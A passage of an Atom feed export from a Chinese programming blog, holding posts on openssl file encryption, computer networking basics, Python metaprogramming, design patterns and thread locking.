q.val:</div><div class="line">                #值相同的时候，比较左子树</div><div class="line">                if self.isSameTree(p.left,q.left):</div><div class="line">                    #如果左子树相同，比较右子树</div><div class="line">                    return self.isSameTree(p.right,q.right)</div><div class="line">            #如果值不相同</div><div class="line">            return False</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近两天当了三次面试官，刚开始面试的时候不知道问些什么，后来就形成套路了，基本就是先是Python语法，多线程多进程，然后是数据分析，数据结构与算法，操作系统，Linux，数据库。不过有些问题自己也不知道答案。。。为了防止自己什么时候卡壳，所以总结一下这个面试指南，得指南者
    
    </summary>
    
      <category term="面试" scheme="http://microndgt.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>密钥加解密</title>
    <link href="http://microndgt.github.io/2017/02/17/%E5%AF%86%E9%92%A5%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    <id>http://microndgt.github.io/2017/02/17/密钥加解密/</id>
    <published>2017-02-17T08:03:45.000Z</published>
    <updated>2017-02-17T08:12:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用不同的加密算法与加密模式进行加密"><a href="#使用不同的加密算法与加密模式进行加密" class="headerlink" title="使用不同的加密算法与加密模式进行加密"></a>使用不同的加密算法与加密模式进行加密</h1><p><code>openssl enc</code>加密解密文件,<code>openssl enc ciphertype -e -in plain.txt -out cipher.bin -K 00112233445566778899aabbccddeeff -iv 0102030405060708</code></p>
<p>cipher 密码，密码(cipher):指 bf, cast, des, aes, rs2 等 加密模式(encryption mode):指 cbc, ecb, cfb, ofb 等。两者组合起来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-K/-iv 十六进制密钥与初始向量</div><div class="line">-e 加密</div><div class="line">-d 解密</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;使用不同的加密算法与加密模式进行加密&quot;&gt;&lt;a href=&quot;#使用不同的加密算法与加密模式进行加密&quot; class=&quot;headerlink&quot; title=&quot;使用不同的加密算法与加密模式进行加密&quot;&gt;&lt;/a&gt;使用不同的加密算法与加密模式进行加密&lt;/h1&gt;&lt;p&gt;&lt;code&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://microndgt.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="http://microndgt.github.io/2017/02/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>http://microndgt.github.io/2017/02/17/计算机网络/</id>
    <published>2017-02-17T06:03:41.000Z</published>
    <updated>2017-02-18T11:31:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>网络中运行的端系统和网络应用，计算机网络的核心，传输数据的链路和交换机，链接端系统与网络核心的接入网和物理媒体。</p>
<h1 id="因特网"><a href="#因特网" class="headerlink" title="因特网"></a>因特网</h1><h2 id="网络的具体构成"><a href="#网络的具体构成" class="headerlink" title="网络的具体构成"></a>网络的具体构成</h2><p>设备：主机或端系统，端系统通过通信链路和分组交换机链接在一起，链路的速率是bps度量，数据发送是，发送端将数据分段，每段加上首部字节。这样的信息包称为分组。两种分组交换机是路由器和链路层交换机。分组交换机类似于立交桥。</p>
<p>端系统通过因特网服务提供商ISP接入互联网，每个ISP是一个由多个分组交换机和多段通信链路组成的网络。地层ISP通过国家的，国际的高层ISP互联起来，高层ISP是由通过高速光纤链路互联的高速路由器组成的。</p>
<p>信息接收和发送的协议：TCP传输控制协议,IP网际协议。</p>
<h2 id="服务描述"><a href="#服务描述" class="headerlink" title="服务描述"></a>服务描述</h2><p>从为应用程序提供服务的基础设施的角度来描述互联网，互联网是一种基础设施，新应用程序正在其上不断的发明和设置。</p>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>完成一项工作，要求两个通信实体运行相同的协议。一个协议定义了在两个或多个通信实体之间交换的报文格式和次序，以及在报文传输和接收或其他事件方面所采取的动作。</p>
<h2 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h2><p>端系统连接到器边缘路由器的物理链路，边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器。</p>
<h2 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h2><p>通过网络链路和交换机移动数据有两种方法，电路交换和分组交换。电路交换需要的资源在通信会话期间会被预留。分组交换网络，这些资源不被预留。电话网络是电路交换网络。因特网是分组交换网络。因特网尽力而为的以适时的方式传递分组。</p>
<h2 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h2><p>存储转发传输，当路由器已经接收完了该分组的所有比特后，它才能开始向出链路传输，即转发该分组</p>
<p>排队时延和分组丢失，对于每条相连的链路，该分组交换机有一个输出缓存，缓存空间是有限的，网络拥塞程度越大，排队时延越大，还有可能出现分组丢失。</p>
<p>转发表和路由选择协议，源在该分组的首部包含了目的地的IP地址，每台路由器具有一个转发表，用于将目的地址映射城输出链路。路由器使用分组的目的地址来索引转发表并决定适当的出链路，因特网具有一些特殊的路由选择协议，用于自动的设置这些转发表，一个路由选择协议可以决定从每台路由器到每个目的地的最短路径，并使用这些最短路径结果来配置路由器中的转发表。</p>
<h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>在端系统间通话会话期间，预留了端系统间通信沿路径所需要的资源，缓存，链路传输速率，传统的电话网络是电路交换网络的例子，建立链接后，沿着发送方和接收方之间路径上的交换机都将为该链接维护链接状态，当网络创建这种电路时候，他也在链接期间在该网络链路上预留了恒定的传输速率，表示为每条链路传输容量的一部分。</p>
<h2 id="分组交换网中的时延"><a href="#分组交换网中的时延" class="headerlink" title="分组交换网中的时延"></a>分组交换网中的时延</h2><p>分组在每个节点经受了以下几种不同类型的时延，节点处理时延，排队时延，传输时延和传播时延，加起来是节点总时延。</p>
<p>处理时延，检查分组首部和决定将分组导向何处所需要的时间是处理时延的一部分。处理之后，路由器将该分组引向通往路由器B链路之前的队列。</p>
<p>排队时延，在队列中，当分组在链路上等待传输的时候，经受排队时延。到达分组期待发现的分组数量是到达该队列的流量的强度和性质的函数。</p>
<p><strong><em>传输时延</em></strong>,传输时延L/R是将所有分组的比特推向链路所需要的时间</p>
<p>传播时延，从链路的起点到路由器B传播所需要的时间是传播时延</p>
<h2 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h2><p>到达路由器队列的分组发现一个满的队列，由于没有地方存储这个分组，路由器将丢弃该分组，丢包现象是一个分组已经传输到网络核心，绝不会从网络发送到目的地，分组丢失的份额随着流量强度增加而增加，因此，一个节点的性能也需要根据分组丢失的概率来度量。</p>
<h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>除了时延和丢包，另外一个性能指标是端到端吞吐量，在任何时间瞬时吞吐量是主机B接受到该文件的速率。对于简单的两链路的网络，吞吐量是最小的链路速率，它是瓶颈链路的传输速率。吞吐量取决于数据流过的链路的传输速率，近似于沿着源和目的地之间路径的最小传输速率。</p>
<h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><p>分层只要每个层次的接口不变，实现的功能不变，那么怎么实现它，改变服务的实现而不影响该系统其他组件是分层的优点。每层通过在该层中执行某些动作或使用直接下层的服务来提供服务。因特网的协议栈由5个层次组成，物理层，链路层，网络层，运输层和应用层。</p>
<p>应用层，HTTP，SMTP，FTP，DNS，位于应用层的信息分组称为报文</p>
<p>运输层，在应用程序端点之间传送应用层报文。TCP，面向连接的服务，确保传递和流量控制。UDP提供无连接服务，运输层分组称为报文段</p>
<p>网络层，负责将数据报的网络层分组从一台主机移动到另一台主机，IP协议，协议定义了数据报中的各个字段以及端系统和路由器如何作用于这些字段，也包括决定路由的路由选择协议，IP是将因特网链接在一起的</p>
<p>链路层，一个数据报可能被沿途不同链路上的不同链路层协议处理，网络层将受到来自每个不同的链路层协议的不同服务，链路层分组称为帧</p>
<p>物理层，将帧中的一个个比特从一个节点移动到下一个节点，这层的协议是链路相关的，进一步和链路的实际传输媒体相关。</p>
<p>OSI模型中多了两层，表示层和会话层，在应用层和运输层之间，表示层的作用是使得通信的应用程序能够解释交换数据的含义，会话层提供了数据交换定界功能，应用程序开发者决定一个服务是否重要，在应用程序中构建该功能。</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>路由器和链路层交换机以多层次的方式组织他们的网络硬件和软件，链路层交换机实现了物理层和链路层，路由器实现了物理层，链路层和网络层，能够实现IP协议，链路层交换机不能识别IP地址，但是能够识别第二层地址，以太网地址。</p>
<p>应用层报文传到运输层，加上运输层首部信息形成运输层报文段，然后向网路层传递报文段，网路层增加源和目的端系统地址等网路层首部信息，产生了网路层数据报，然后传给链路层，链路层增加自己的链路层首部信息并且创建链路层帧。所以一个分组具有两种类型的字段，首部字段和有效载荷字段。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网络中运行的端系统和网络应用，计算机网络的核心，传输数据的链路和交换机，链接端系统与网络核心的接入网和物理媒体。&lt;/p&gt;
&lt;h1 id=&quot;因特网&quot;&gt;&lt;a href=&quot;#因特网&quot; class=&quot;headerlink&quot; title=&quot;因特网&quot;&gt;&lt;/a&gt;因特网&lt;/h1&gt;&lt;h2 i
    
    </summary>
    
      <category term="计算机网络" scheme="http://microndgt.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Python 元编程2</title>
    <link href="http://microndgt.github.io/2017/02/17/Python-%E5%85%83%E7%BC%96%E7%A8%8B2/"/>
    <id>http://microndgt.github.io/2017/02/17/Python-元编程2/</id>
    <published>2017-02-17T02:16:05.000Z</published>
    <updated>2017-02-17T03:28:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="装饰器为被包装函数增加参数"><a href="#装饰器为被包装函数增加参数" class="headerlink" title="装饰器为被包装函数增加参数"></a>装饰器为被包装函数增加参数</h1><p>在装饰器中给被包装函数增加额外的参数,可以使用关键字参数来给被包装函数增加额外参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">from functools import wraps</div><div class="line">def optional_debug(func):</div><div class="line">    @wraps(func)</div><div class="line">    def wrapper(*args, debug=True, **kwargs):</div><div class="line">        if debug:</div><div class="line">            print(&apos;Calling&apos;, func.__name__)</div><div class="line">        return func(*args, **kwargs)</div><div class="line">    return wrapper</div><div class="line">@optional_debug</div><div class="line">def spam(a, b, c):</div><div class="line">    print(a, b, c)</div><div class="line">spam(1, 2, 3)</div><div class="line">spam(1, 2, 3, debug=True)</div></pre></td></tr></table></figure>
<p>可以避免一些重复代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">def a(x, debug=False):</div><div class="line">    if debug:</div><div class="line">        print(&apos;Calling a&apos;)</div><div class="line">def b(x, y, z, debug=False):</div><div class="line">    if debug:</div><div class="line">        print(&apos;Calling b&apos;)</div><div class="line">from functools import wraps</div><div class="line">import inspect</div><div class="line">def optional_debug(func):</div><div class="line">    if &apos;debug&apos; in inspect.getargspec(func).args:</div><div class="line">        raise TypeError(&apos;debug argument already defined&apos;)</div><div class="line">    @wraps(func)</div><div class="line">    def wrapper(*args, debug=False, **kwargs):</div><div class="line">        if debug:</div><div class="line">            print(&apos;Calling&apos;, func.__name__)</div><div class="line">        return func(*args, **kwargs)</div><div class="line">    return wrapper</div><div class="line">@optional_debug</div><div class="line">def a(x):</div><div class="line">    pass</div><div class="line">@optional_debug</div><div class="line">def b(x, y, z):</div><div class="line">    pass</div></pre></td></tr></table></figure>
<h1 id="使用装饰器扩充类的功能"><a href="#使用装饰器扩充类的功能" class="headerlink" title="使用装饰器扩充类的功能"></a>使用装饰器扩充类的功能</h1><p>通过反省或者重写类定义的某部分来修改它的行为，这种情况是类装饰器最好的使用场景了，下面是重写了特殊方法<code>__getattribute__</code>的类装饰器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def log_getattribute(cls):</div><div class="line">    orig_getattribute = cls.__getattribute__</div><div class="line">    def new_getattribute(self, name):</div><div class="line">        print(&apos;getting:&apos;, name)</div><div class="line">        return orig_getattribute(self, name)</div><div class="line">    cls.__getattribute__ = new_getattribute</div><div class="line">    return cls</div><div class="line">@log_getattribute</div><div class="line">class A:</div><div class="line">    def __init__(self, x):</div><div class="line">        self.x = x</div><div class="line">    def spam(self):</div><div class="line">        pass</div></pre></td></tr></table></figure>
<p>类装饰器通常可以作为其他高级技术比如混入或元类的一种非常简洁的替代方案。</p>
<p>使用继承的方案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">class LoggedGetattribute:</div><div class="line">    def __getattribute__(self, name):</div><div class="line">        print(&apos;getting:&apos;, name)</div><div class="line">        return super().__getattribute__(name)</div><div class="line"># Example:</div><div class="line">class A(LoggedGetattribute):</div><div class="line">    def __init__(self,x):</div><div class="line">        self.x = x</div><div class="line">    def spam(self):</div><div class="line">        pass</div></pre></td></tr></table></figure>
<h1 id="使用元类控制实例的创建"><a href="#使用元类控制实例的创建" class="headerlink" title="使用元类控制实例的创建"></a>使用元类控制实例的创建</h1><p>通过改变实例创建方式来实现单例，缓存等。自定义创建实例的方式，可以定义一个元类并自己实现<code>__call__()</code>方法。继承type的类叫做元类，元类是创建类的类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">class NoInstance(type):</div><div class="line">    def __call__(self, *args, **kwargs):</div><div class="line">        raise TypeError(&apos;can not instantiate directly&apos;)</div><div class="line">class Spam(metaclass=NoInstance):</div><div class="line">    @staticmethod</div><div class="line">    def grok(x):</div><div class="line">        print(&apos;Spam.grok&apos;)</div></pre></td></tr></table></figure>
<p>所以只能调用静态方法，不能创建它的实例。下面是实现单例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">class Singleton(type):</div><div class="line">    def __init__(self, *args, **kwargs):</div><div class="line">        self.__instance = None</div><div class="line">        super().__init__(*args, **kwargs)</div><div class="line"></div><div class="line">    def __call__(self, *args, **kwargs):</div><div class="line">        if self.__instance is None:</div><div class="line">            self.__instance = super().__call__(*args, **kwargs)</div><div class="line">            return self.__instance</div><div class="line">        else:</div><div class="line">            return self.__instance</div><div class="line">class Spam(metaclass=Singleton):</div><div class="line">    def __init__(self):</div><div class="line">        print(&apos;Creating Spam&apos;)</div></pre></td></tr></table></figure>
<p>利用元类实现多种实例创建模式通常要比不使用元类的方式优雅得多。</p>
<h1 id="定义有可选参数的元类"><a href="#定义有可选参数的元类" class="headerlink" title="定义有可选参数的元类"></a>定义有可选参数的元类</h1><p>定义类的时候，使用<code>metaclass</code>参数来指定特定的元类：元类是用来控制类的创建的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from abc import ABCMeta, abstractmethod</div><div class="line">class IStream(metaclass=ABCMeta):</div><div class="line">    @abstractmethod</div><div class="line">    def read(self, maxsize=None):</div><div class="line">        pass</div><div class="line">    @abstractmethod</div><div class="line">    def write(self, data):</div><div class="line">        pass</div></pre></td></tr></table></figure>
<p>在自定义元类中我们还可以提供其他的关键字参数,为了使元类支持这些关键字参数，你必须确保在 <code>__prepare__()</code> , <code>__new__()</code> 和 <code>__init__()</code> 方法中都使用强制关键字参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">class Spam(metaclass=MyMeta, debug=True, synchronize=True):</div><div class="line">    pass</div><div class="line">class MyMeta(type):</div><div class="line">    # Optional</div><div class="line">    @classmethod</div><div class="line">    def __prepare__(cls, name, bases, *, debug=False, synchronize=False):</div><div class="line">        # Custom processing</div><div class="line">        pass</div><div class="line">        return super().__prepare__(name, bases)</div><div class="line">    # Required</div><div class="line">    def __new__(cls, name, bases, ns, *, debug=False, synchronize=False):</div><div class="line">        # Custom processing</div><div class="line">        pass</div><div class="line">        return super().__new__(cls, name, bases, ns)</div><div class="line">    # Required</div><div class="line">    def __init__(self, name, bases, ns, *, debug=False, synchronize=False):</div><div class="line">        # Custom processing</div><div class="line">        pass</div><div class="line">        super().__init__(name, bases, ns)</div></pre></td></tr></table></figure>
<p><code>__prepare__()</code>方法在所有类定义开始执行前首先被调用，用来创建类命名空间。 通常来讲，这个方法只是简单的返回一个字典或其他映射对象。 <code>__new__()</code>方法被用来实例化最终的类对象。它在类的主体被执行完后开始执行。 <code>__init__()</code> 方法最后被调用，用来执行其他的一些初始化工作。通过使用强制关键字参数，在类的创建过程中我们必须通过关键字来指定这些参数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;装饰器为被包装函数增加参数&quot;&gt;&lt;a href=&quot;#装饰器为被包装函数增加参数&quot; class=&quot;headerlink&quot; title=&quot;装饰器为被包装函数增加参数&quot;&gt;&lt;/a&gt;装饰器为被包装函数增加参数&lt;/h1&gt;&lt;p&gt;在装饰器中给被包装函数增加额外的参数,可以使用关键字
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
  <entry>
    <title>Python 设计模式</title>
    <link href="http://microndgt.github.io/2017/02/15/Python-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <id>http://microndgt.github.io/2017/02/15/Python-设计模式/</id>
    <published>2017-02-15T07:56:20.000Z</published>
    <updated>2017-02-15T08:16:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工厂模式-The-Factory-Pattern"><a href="#工厂模式-The-Factory-Pattern" class="headerlink" title="工厂模式 The Factory Pattern"></a>工厂模式 The Factory Pattern</h1><p>解决对象创建问题，处理对象创建，客户端可以申请一个对象而不用知道对象被哪个class创建。可以方便地解耦对象的使用和创建。有两种实现，工厂方法和抽象工厂.</p>
<h2 id="工厂方法"><a href="#工厂方法" class="headerlink" title="工厂方法"></a>工厂方法</h2><p>执行单独的函数，通过传参提供需要的对象的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">import xml.etree.ElementTree as etree</div><div class="line">class JSONConnector:</div><div class="line">    def __init__(self, filepath):</div><div class="line">        self.data = dict()</div><div class="line">        with open(filepath, mode=&apos;r&apos;, encoding=&apos;utf8&apos;) as f:</div><div class="line">            self.data = json.load(f)</div><div class="line">    @property</div><div class="line">    def parsed_data(self):</div><div class="line">        return self.data</div><div class="line">class XMLConnector:</div><div class="line">    def __init__(self, filepath):</div><div class="line">        self.tree = etree.parse(filepath)</div><div class="line">    @property</div><div class="line">    def parsed_data(self):</div><div class="line">        return self.tree</div><div class="line">def connection_factory(filepath):</div><div class="line">    &quot;&quot;&quot; 工厂方法 &quot;&quot;&quot;</div><div class="line">    if filepath.endswith(&apos;json&apos;):</div><div class="line">        connector = JSONConnector</div><div class="line">    elif filepath.endswith(&apos;xml&apos;):</div><div class="line">        connector = XMLConnector</div><div class="line">    else:</div><div class="line">        raise ValueError(&apos;Cannot connect to &#123;&#125;&apos;.format(filepath))</div><div class="line">    return connector(filepath)</div></pre></td></tr></table></figure>
<h2 id="抽象工厂-Abstract-Factory"><a href="#抽象工厂-Abstract-Factory" class="headerlink" title="抽象工厂 Abstract Factory"></a>抽象工厂 Abstract Factory</h2><p>工厂方法适合对象种类较少的情况，如果有多种不同类型对象需要创建，使用抽象工厂模式。在一个抽象工厂类里实现多个关联对象的创建。也就是这些关联对象都实现了相同的方法，因此可以直接调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">class Frog:</div><div class="line">    def __init__(self, name):</div><div class="line">        self.name = name</div><div class="line">    def __str__(self):</div><div class="line">        return self.name</div><div class="line">    def interact_with(self, obstacle):</div><div class="line">        &quot;&quot;&quot; 不同类型玩家遇到的障碍不同 &quot;&quot;&quot;</div><div class="line">        print(&apos;&#123;&#125; the Frog encounters &#123;&#125; and &#123;&#125;!&apos;.format(</div><div class="line">            self, obstacle, obstacle.action()))</div><div class="line">class Bug:</div><div class="line">    def __str__(self):</div><div class="line">        return &apos;a bug&apos;</div><div class="line"></div><div class="line">    def action(self):</div><div class="line">        return &apos;eats it&apos;</div><div class="line">class FrogWorld:</div><div class="line">    def __init__(self, name):</div><div class="line">        print(self)</div><div class="line">        self.player_name = name</div><div class="line">    def __str__(self):</div><div class="line">        return &apos;\n\n\t----Frog World -----&apos;</div><div class="line">    def make_character(self):</div><div class="line">        return Frog(self.player_name)</div><div class="line">    def make_obstacle(self):</div><div class="line">        return Bug()</div><div class="line">class Wizard:</div><div class="line">    def __init__(self, name):</div><div class="line">        self.name = name</div><div class="line">    def __str__(self):</div><div class="line">        return self.name</div><div class="line">    def interact_with(self, obstacle):</div><div class="line">        print(&apos;&#123;&#125; the Wizard battles against &#123;&#125; and &#123;&#125;!&apos;.format(</div><div class="line">            self, obstacle, obstacle.action()))</div><div class="line">class Ork:</div><div class="line">    def __str__(self):</div><div class="line">        return &apos;an evil ork&apos;</div><div class="line">    def action(self):</div><div class="line">        return &apos;kill it&apos;</div><div class="line">class WizardWorld:</div><div class="line">    def __init__(self, name):</div><div class="line">        print(self)</div><div class="line">        self.player_name = name</div><div class="line">    def __str__(self):</div><div class="line">        return &apos;\n\n\t------ Wizard World -------&apos;</div><div class="line">    def make_character(self):</div><div class="line">        return Wizard(self.player_name)</div><div class="line">    def make_obstacle(self):</div><div class="line">        return Ork()</div><div class="line">class GameEnvironment:</div><div class="line">    &quot;&quot;&quot; 抽象工厂，根据不同的玩家类型创建不同的角色和障碍 (游戏环境)</div><div class="line">    这里可以根据年龄判断，成年人返回『巫师』游戏，小孩返回『青蛙过河』游戏&quot;&quot;&quot;</div><div class="line">    def __init__(self, factory):</div><div class="line">        self.hero = factory.make_character()</div><div class="line">        self.obstacle = factory.make_obstacle()</div><div class="line">    def play(self):</div><div class="line">        self.hero.interact_with(self.obstacle)</div><div class="line">GameEnvironment(WizardWorld(&quot;kevin&quot;)).play()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;工厂模式-The-Factory-Pattern&quot;&gt;&lt;a href=&quot;#工厂模式-The-Factory-Pattern&quot; class=&quot;headerlink&quot; title=&quot;工厂模式 The Factory Pattern&quot;&gt;&lt;/a&gt;工厂模式 The Facto
    
    </summary>
    
      <category term="设计模式" scheme="http://microndgt.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python并发编程2</title>
    <link href="http://microndgt.github.io/2017/02/14/Python%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B2/"/>
    <id>http://microndgt.github.io/2017/02/14/Python并发编程2/</id>
    <published>2017-02-14T04:23:49.000Z</published>
    <updated>2017-02-15T04:10:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>并发编程第二部分,并没有深入研究</p>
<h1 id="给关键部分加锁"><a href="#给关键部分加锁" class="headerlink" title="给关键部分加锁"></a>给关键部分加锁</h1><p>一次仅允许一个进程使用的资源称为临界资源。临界区内放的一般是被1个以上的进程或线程（以下只说进程）共用的数据。临界区内的数据一次只能同时被一个进程使用，当一个进程使用临界区内的数据时，其他需要使用临界区数据的进程进入等待状态。</p>
<p>在多线程程序中安全使用可变对象，使用threading库中的Lock对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">class SharedCounter:</div><div class="line">    def __init__(self, initial_value=0):</div><div class="line">        self._value = initial_value</div><div class="line">        self._value_lock = threading.Lock()</div><div class="line">    def incr(self, delta=1):</div><div class="line">        with self._value_lock:</div><div class="line">            self._value += delta</div><div class="line">    def decr(self, delta=1):</div><div class="line">        with self._value_lock:</div><div class="line">            self._value -= delta</div></pre></td></tr></table></figure>
<p>线程调度本质上是不稳定的。RLock可重入锁，可以被同一个线程多次获取，主要用来实现基于监测对象模式的锁定和同步。在使用这种锁的情况下,当锁被持有时,只有一个线程可以使用完整 的函数或者类中的方法。一个被所 有实例共享的类级锁。这个锁用来同步类方法,具体来说就是,这个锁可以保证一次 只有一个线程可以调用这个类方法。不过,与一个标准的锁不同的是,已经持有这个 锁的方法在调用同样使用这个锁的方法时,无需再次获取锁。</p>
